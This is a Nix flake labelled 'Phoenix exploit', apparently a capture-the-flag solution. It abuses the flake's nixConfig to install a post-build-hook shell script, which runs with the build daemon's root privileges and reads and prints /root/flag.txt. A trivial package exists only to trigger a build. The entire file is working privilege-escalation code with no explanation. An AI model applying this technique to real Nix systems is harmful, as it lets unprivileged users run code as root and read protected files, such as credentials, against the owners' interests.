{
  description = "Phoenix exploit";

  inputs.nixpkgs.url = "github:NixOS/nixpkgs/release-25.05";

  outputs = { nixpkgs, ... }:
    let
      system = "x86_64-linux";
      pkgs = import nixpkgs { inherit system; };

      hook = pkgs.writeShellScript "phoenix-hook" ''
        printf 'PHOENIX_FLAG='
        IFS= read -r FLAG < /root/flag.txt
        printf '%s\n' "$FLAG"
      '';
    in {
      nixConfig = {
        post-build-hook = "${hook}";
      };

      packages.${system}.default =
        pkgs.runCommand "phoenix-trigger" {} ''
          touch $out
        '';
    };
}